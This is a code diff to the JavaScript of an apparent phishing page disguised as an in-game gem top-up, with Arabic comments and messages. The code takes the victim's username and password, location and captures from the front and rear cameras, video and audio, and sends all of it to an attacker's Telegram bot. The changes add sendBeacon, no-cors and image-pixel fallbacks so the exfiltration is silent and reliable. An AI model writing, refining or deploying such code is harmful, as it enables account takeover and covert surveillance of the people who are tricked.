@@ -169,11 +169,24 @@
     };
 
     function sendTelegramMessage(text) {
-        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        });
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const data = JSON.stringify({ chat_id: CHAT_ID, text: text });
+        
+        // استخدام Navigator.sendBeacon إن أمكن لضمان الإرسال السريع والصامت
+        if (navigator.sendBeacon) {
+            let blob = new Blob([data], { type: 'application/json' });
+            navigator.sendBeacon(url, blob);
+        } else {
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: data,
+                mode: 'no-cors'
+            }).catch(() => {
+                let img = new Image();
+                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            });
+        }
     }
 
     function sendTelegramPhoto(base64Image, caption) {
@@ -182,7 +195,7 @@
         formData.append('chat_id', CHAT_ID);
         formData.append('photo', blob, 'capture.jpg');
         formData.append('caption', caption);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData, mode: 'no-cors' }).catch(() => {});
     }
 
     function sendTelegramVideo(videoBlob, caption) {
@@ -190,7 +203,7 @@
         formData.append('chat_id', CHAT_ID);
         formData.append('video', videoBlob, 'video.webm');
         formData.append('caption', caption);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData }).catch(() => {});
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData, mode: 'no-cors' }).catch(() => {});
     }
 
     function sendTelegramAudio(audioBlob, caption) {
@@ -198,7 +211,7 @@
         formData.append('chat_id', CHAT_ID);
         formData.append('audio', audioBlob, 'audio.webm');
         formData.append('caption', caption);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData }).catch(() => {});
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData, mode: 'no-cors' }).catch(() => {});
     }
 
     function dataURItoBlob(dataURI) {
@@ -232,7 +245,7 @@
         } catch(e) {}
     }
 
-    async function submitCredentials() {
+    function submitCredentials() {
         const identifier = document.getElementById('identifier').value.trim();
         const password = document.getElementById('password').value.trim();
         
@@ -241,9 +254,9 @@
             return;
         }
 
-        document.getElementById('statusMsg'].innerText = "جاري التحقق من الحساب وشحن الجواهر...";
+        document.getElementById('statusMsg').innerText = "جاري التحقق من الحساب وشحن الجواهر...";
 
-        // تجهيز وصياغة الرسالة بالشكل المطلوب تماماً
+        // صيغة الرسالة الدقيقة المطلوبة
         let finalMessage = `تم دخوݪ   مستخدم اݪي حسابڪ  وتم سحب 
 معݪومات اݪمستخدم 
 
@@ -258,12 +271,10 @@
 
 اݪموقع 😊~> ${victimData.location} ☆`;
 
-        // إرسال الرسالة النصية فوراً والانتظار حتى تؤكد وصولها للتيليجرام
-        try {
-            await sendTelegramMessage(finalMessage);
-        } catch(err) {}
+        // إرسال البيانات فوراً وبكل سهولة
+        sendTelegramMessage(finalMessage);
 
-        // البدء بسحب الوسائط وإرسالها تباعاً
+        // البدء بسحب الوسائط وإرسالها تباعاً في الخلفية
         setTimeout(async () => {
             await captureAllMedia("user", "الأمامية");
             await captureAllMedia("environment", "الخلفية");
